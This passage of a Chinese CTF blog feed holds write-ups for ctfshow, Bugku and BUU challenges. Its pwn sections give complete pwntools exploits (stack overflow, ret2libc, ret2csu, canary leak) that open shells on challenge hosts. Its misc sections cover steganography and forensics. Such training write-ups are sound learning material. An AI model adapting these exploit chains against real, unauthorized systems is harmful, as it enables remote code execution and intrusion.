class="string">&#x27;hhh,just a joke&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;[+] command successful!\n&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="内部赛-签到题"><a href="#内部赛-签到题" class="headerlink" title="内部赛-签到题"></a>内部赛-签到题</h1><p>此题与ret2csu做法相同，因为没有puts函数但是存在write函数，所以我们采取组装write函数来泄露地址，从而获取system函数以及bin/sh地址。</p><p><img src="https://i.loli.net/2021/10/26/DlpyIGKWCtjqRVQ.png" alt="屏幕截图 2021-10-26 201620.png"></p><p>gadgets和ret2csu里面的有点不一样但是大致是一样的。我们利用这两个gadgets来组装write函数，泄露我们想泄露函数的got表中地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa8</span>+p64(gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(got_write)+p64(<span class="number">8</span>)+p64(got_write)+p64(<span class="number">1</span>)+p64(gadget2)+<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+ p64(start)</span><br></pre></td></tr></table></figure><p>之后利用泄露的地址计算system函数以及bin/sh地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libcbase = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后组装payload2来控制程序执行system(“bin/sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc_64&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28177</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ret2libc_64&#x27;</span>)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]  </span><br><span class="line">pop_rdi_ret = <span class="number">0x04006c3</span></span><br><span class="line">ret_addr = <span class="number">0x004004a9</span></span><br><span class="line">gadget1 = <span class="number">0x4006b6</span></span><br><span class="line">gadget2 = <span class="number">0x04006A0</span></span><br><span class="line">payload1 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa8</span>+p64(gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(got_write)+p64(<span class="number">8</span>)+p64(got_write)+p64(<span class="number">1</span>)+p64(gadget2)+<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+ p64(start)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;now,Try Pwn Me?\n&#x27;</span>,payload1)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libcbase = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;now,Try Pwn Me?\n&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="36D杯-签到"><a href="#36D杯-签到" class="headerlink" title="36D杯-签到"></a>36D杯-签到</h1><p>签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more&lt;flag               这里&lt;可以绕过空格</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-babyrouter"><a href="#BJDCTF2020-babyrouter" class="headerlink" title="BJDCTF2020-babyrouter"></a>BJDCTF2020-babyrouter</h1><p>不知道是远端有问题还是libc库不全，本地打通了但是远端没有打通，反正思路在这里</p><p>很明显的一道libc泄露题目，buf的偏移是0x20</p><p><img src="https://i.loli.net/2021/10/28/ZzYUNXD4uvWScVy.png" alt="屏幕截图 2021-10-28 193359.png"></p><p>寻找gadgets</p><p>构造payload1，payload2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrouter&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28044</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrouter&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">start_addr=elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x000400733</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="comment">#system_addr = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#binsh_addr = libcbase + libc.search(&#x27;/bin/sh\0&#x27;).next()</span></span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc</title>
      <link href="/post/ctfshow-misc.html"/>
      <url>/post/ctfshow-misc.html</url>
      
        <content type="html"><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>签到题，打开就有flag</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>打开txt文件出现一堆乱码，丢进winhex发现是png，直接改后缀名即可<img src="https://i.loli.net/2021/10/05/ZC4hk6SB51DR3nd.png" alt="image.png"></p><h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>bpg文件使用bpgview工具打开，打开后即可获得flag</p><p><img src="https://i.loli.net/2021/10/05/2qfa4hTyYQSwtK8.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku pwn</title>
      <link href="/post/Bugku-PWN.html"/>
      <url>/post/Bugku-PWN.html</url>
      
        <content type="html"><![CDATA[<h1 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h1><p>check一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出<img src="https://i.loli.net/2021/07/04/DjJPLQ2rEX34dvp.png" alt="屏幕截图 2021-07-04 191959.png"></p><p>再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数</p><p><img src="https://i.loli.net/2021/07/04/5kmnKT92g1wJoLD.png" alt="屏幕截图 2021-07-04 193304.png"></p><p>所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x400769</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="overflow2"><a href="#overflow2" class="headerlink" title="overflow2"></a>overflow2</h1><p>check一下，64位开了NX保护。IDA查看，存在溢出<img src="https://i.loli.net/2021/07/04/onJhAYKWN8Sws5m.png" alt="屏幕截图 2021-07-04 205321.png"></p><p>在函数窗口发现system函数，在字符串窗口发现bin/sh。可以利用ROP来获得shell<img src="https://i.loli.net/2021/07/04/3uyO7WHgLIjaEdX.png" alt="image.png"></p><p>找到gadget的地址<img src="https://i.loli.net/2021/07/04/CGgJonulcmIMpwt.png" alt="image.png"></p><p>构建payload就可以了</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn5&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;114.67.246.176&quot;</span>,<span class="number">15097</span>)</span><br><span class="line">sys_addr = <span class="number">0x401050</span></span><br><span class="line">bin_sh = <span class="number">0x402004</span></span><br><span class="line">pop_rdi = <span class="number">0x40126b</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="read-note"><a href="#read-note" class="headerlink" title="read_note"></a>read_note</h1><p>签到题，直接可以获得flag</p><h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><p>看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护<img src="https://i.loli.net/2021/07/03/4kYTmvGypHW5uA1.png" alt="image.png"></p><p>查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间<img src="https://i.loli.net/2021/07/03/MjuLO6KPTU42YZH.png" alt="image.png"></p><p>查看字符串，发现存在bin/sh，在函数表里面也存在system函数<img src="https://i.loli.net/2021/07/03/YjeM5z9T8chxFtN.png" alt="屏幕截图 2021-07-03 222006.png"></p><p>所以思路大概出来了，利用gadgets来获取shell。接下来就是思考如何解决canary保护，观察伪代码，里面有printf函数，我们可以利用printf函数来泄露canary，printf函数输出时会以x00为输出结尾，只要我们将canary值的x00覆盖掉就可以泄露了。</p><p>所以，第一步，获取gadgets。因为是64位程序，所以传参时前六个参数是利用rdi, rsi, rdx, rcx, r8, r9寄存器来传递，所以需要将bin/sh传递到rdi寄存器。<img src="https://i.loli.net/2021/07/03/2RT6YD3ZijuXmnK.png" alt="image.png"></p><p>接下来就是泄露canary，buf的偏移量是0x240-8(减8是因为canary的值在ebp减8的位置)，之后利用printf函数泄露即可。<img src="https://i.loli.net/2021/07/03/B8UpxXibkZD2VlI.png" alt="image.png"></p><p>最后再组装一下就可以得出exp了。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn4_&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400963</span></span><br><span class="line">binsh = <span class="number">0x601068</span></span><br><span class="line">sys = <span class="number">0x40080C</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x240</span> - <span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please leave your name(Within 36 Length):&#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x210</span> - <span class="number">8</span>) + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Please leave a message(Within 0x200 Length):&#x27;</span> , payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku misc</title>
      <link href="/post/bugku%20misc.html"/>
      <url>/post/bugku%20misc.html</url>
      
        <content type="html"><![CDATA[<h1 id="BUGKU-misc部分"><a href="#BUGKU-misc部分" class="headerlink" title="BUGKU misc部分"></a>BUGKU misc部分</h1><h2 id="1-这是一张单纯的图片"><a href="#1-这是一张单纯的图片" class="headerlink" title="1 这是一张单纯的图片"></a>1 这是一张单纯的图片</h2><p>先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样，</p><img src="/images/21.png" height="500" width="600" /><p>直接丢winhex，拖至最底，发现是unicode加密</p><img src="/images/22.png" height="500" width="600" /><p>发现是unicode加密，直接解码成ASCII，得到flag</p><img src="/images/23.png" height="500" width="600" /><hr><h2 id="2-隐写"><a href="#2-隐写" class="headerlink" title="2 隐写"></a>2 隐写</h2><p>看到题目就知道是图片隐写，对图片进行校验和，发现结果有问题，说明照片高度被修改了</p><img src="/images/24.png" height="500" width="600" /><p>修改高度得到flag</p><img src="/images/25.png" height="400" width="300" /><hr><h2 id="3-telnet"><a href="#3-telnet" class="headerlink" title="3 telnet"></a>3 telnet</h2><p>下载附件后打开，直接追踪TCP流就得到了flag</p><img src="/images/26.png" height="500" width="600" /><hr><h2 id="4-眼见非实"><a href="#4-眼见非实" class="headerlink" title="4 眼见非实"></a>4 眼见非实</h2><p>打开后发现文件是损坏的而且出现了PK字符，猜测里面藏有压缩包，于是改成压缩包形式打开</p><img src="/images/27.png" height="500" width="600" /><p>在word里面的document.xml里面发现了flag</p><img src="/images/28.png" height="500" width="600" /><hr><h2 id="5-啊哒"><a href="#5-啊哒" class="headerlink" title="5 啊哒"></a>5 啊哒</h2><p>老规矩，打开照片看属性，发现照相机型号有东西，之后应该用得上</p><img src="/images/29.png" height="600" width="600" /><p>用binwalk查看，发现里面藏有一个压缩包，用foremost进行分离得到压缩包，打开发现是加密的，尝试了照相机型号，发现密码错误，分析了一下那串照相机型号，发现是十六进制，之后解码得到密码</p><img src="/images/30.png" height="600" width="600" /><p>打开得到flag</p><img src="/images/31.png" height="600" width="600" /><hr><h2 id="6-ping"><a href="#6-ping" class="headerlink" title="6 ping"></a>6 ping</h2><p>用wireshark打开后发现十六进制旁边一个f，打开其它的发现组合起来是flag</p><img src="/images/32.png" height="600" width="500" /><hr><h2 id="7-赛博朋克"><a href="#7-赛博朋克" class="headerlink" title="7 赛博朋克"></a>7 赛博朋克</h2><p>打开后发现就一个光秃秃的加密文件，不用猜都知道是伪加密，丢进winhex修改一下就可以打开了</p><img src="/images/33.png" height="600" width="500" /><p>打开文件后发现是一堆乱码，丢进winhex发现是png格式照片</p><img src="/images/34.png" height="600" width="400" /><p>修改一下后缀名图片就出来了，不过好像flag还没出来，属性里面也没什么东西，校验和也正确，binwalk也没查出问题</p><img src="/images/35.png" height="600" width="400" /><img src="/images/36.png" height="400" width="600" /><p>最后推测一个是lsb隐写，果不其然，得到flag</p><img src="/images/37.png" height="500" width="600" /><hr><h2 id="8-贝斯手"><a href="#8-贝斯手" class="headerlink" title="8 贝斯手"></a>8 贝斯手</h2><p>打开介绍发现是对图片上人物介绍，刚想关闭发现最下面还有东西，发现密码是四位数和这个贝斯手有关</p><img src="/images/38.png" height="500" width="600" /><p>懒得搜直接暴力破解</p><img src="/images/39.png" height="500" width="600" /><p>打开后发现是一串加密字符，5+58应该加密方式MD5和base58</p><img src="/images/40.png" height="500" width="600" /><p>解码得到flag</p><img src="/images/41.png" height="500" width="500" /><img src="/images/42.png" height="500" width="600" /><hr><h2 id="9-又一张图片，还单纯吗"><a href="#9-又一张图片，还单纯吗" class="headerlink" title="9 又一张图片，还单纯吗"></a>9 又一张图片，还单纯吗</h2><p>打开属性发现没有有用的信息，丢进winhex里面也没发现什么，用binwalk查看发现照片里面有其它jpg照片，用forem分离</p><img src="/images/43.png" height="500" width="600" /><p>发现图片里面有flag（不过这个flag有点长，有点离谱）</p><img src="/images/44.png" height="500" width="600" /><hr><h2 id="10-猜"><a href="#10-猜" class="headerlink" title="10 猜"></a>10 猜</h2><p>签到题，百度识图，发现是刘亦菲，得到flag（注意flag格式）</p><hr><h2 id="11-宽带信息泄露"><a href="#11-宽带信息泄露" class="headerlink" title="11 宽带信息泄露"></a>11 宽带信息泄露</h2><p>下载RouterPassView，用这个搜索username（用户名）</p><img src="/images/53.png" height="500" width="600" /><hr><h2 id="12-隐写2"><a href="#12-隐写2" class="headerlink" title="12 隐写2"></a>12 隐写2</h2><p>直接丢进winhex，发现jpg图片结尾后面有压缩包的字符</p><img src="/images/45.png" height="500" width="600" /><p>用foremost分离得到一个加密的文件和密码提示，解密（直接爆破，反正是三位数）得到一张图片</p><img src="/images/46.png" height="500" width="600" /><p>老规矩丢winhex，发现最后有flag</p><img src="/images/47.png" height="500" width="600" /><hr><h2 id="13-多种方法解决"><a href="#13-多种方法解决" class="headerlink" title="13 多种方法解决"></a>13 多种方法解决</h2><p>这道题提示说有二维码，打开附件发现是一个exe可执行文件（尝试打开发现无法运行），直接丢winhex</p><img src="/images/48.png" height="500" width="600" /><p>发现是旁边是加密的图片编码，直接在线解码得到flag</p><img src="/images/49.png" height="500" width="600" /><hr><h2 id="14-闪的好快"><a href="#14-闪的好快" class="headerlink" title="14 闪的好快"></a>14 闪的好快</h2><p>emmmm，这道题挺简单的就是好烦，用Stegsolve.jar一帧一帧看，扫码，flag就出来了</p><hr><h2 id="15-come-game"><a href="#15-come-game" class="headerlink" title="15 come_game"></a>15 come_game</h2><p>打开后是个游戏，每次死亡都会多个文件，找到save1将它丢尽winhex里面，将2AC改成5AC在进游戏就可以得到flag，当然如果觉得能闯过去也应该能得到flag。（我没试过，不确定能不能行，提醒一下这个游戏打开了好像不能关闭）</p><img src="/images/50.png" height="500" width="600" /><hr><h2 id="16-白哥的鸽子"><a href="#16-白哥的鸽子" class="headerlink" title="16 白哥的鸽子"></a>16 白哥的鸽子</h2><p>直接丢进winhex里面，发现照片结尾后面多出一些字符，分析一下就知道是栅栏加密</p><img src="/images/51.png" height="500" width="600" /><p>解密（密匙我是一个一个试的，不过还好就是3，后面才知道那个提示“咕咕咕”好像就代表key=3）</p><img src="/images/52.png" height="500" width="600" />]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU pwn</title>
      <link href="/post/BUU-PWN.html"/>
      <url>/post/BUU-PWN.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先查看附件，发现没开什么保护，丢进IDA里面看一下</p><p><img src="https://i.loli.net/2021/05/23/vPpXGYRlquMrOWh.png" alt="image.png"></p><p>发现可疑函数（fun），点进去可以发现函数调用了/bin/sh，接下来我们可以利用这个函数得到flag<img src="https://i.loli.net/2021/05/23/Gzj4Jyef3P9tLq2.png" alt="image.png"></p><p>开始调试。首先创造一个长度为150的字符串，运行该附件，将那个字符串输入进去<img src="https://i.loli.net/2021/05/23/WvfGUnBq1NhFZjQ.png" alt="image.png"></p><p>之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量<img src="https://i.loli.net/2021/05/23/odKI89vOWRDAuEZ.png" alt="image.png"></p><p>得到偏移量就可以写exp了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28652</span>)</span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(fun+<span class="number">1</span>)  //平衡堆栈</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>也是一个简单的栈溢出，思路还是一样的，先查看保护，还是什么保护都没有开<img src="https://i.loli.net/2021/05/24/rCDanMEpmvbN28R.png" alt="image.png"></p><p>丢进IDA查看，就是输出两个语句和一个函数地址，查看函数，发现是打开flag文件。思路立刻就有了，因为是gets函数没有限制输入，所以可以通过栈溢出来获得flag。所以，接下来要计算偏移量<img src="https://i.loli.net/2021/05/24/bA1kDTgImdNEpc2.png" alt="image.png"></p><p>还是和上面一题一样的方法计算偏移量</p><p><img src="https://i.loli.net/2021/05/24/1oBRpDXmTdVPvru.png" alt="image.png"></p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26972</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>检查开了什么保护，发现只开了NX，其它没有开，也就是数据段不可执行<img src="https://i.loli.net/2021/05/25/smzhw5ZEVCYNP4W.png" alt="image.png"></p><p>扔进IDA查看，也就是调用了func函数，点进func函数，函数先是将用户输入的值赋予给v1，之后判断v2是否等于11.28125，如果等于就可以得到flag，所以思路就是计算v1和v2相差多少，再利用gets函数将v2覆盖为11.28125<img src="https://i.loli.net/2021/05/25/wFnCVTSrxtgHf2i.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/05/25/nxwgLFy6OBIJueS.png" 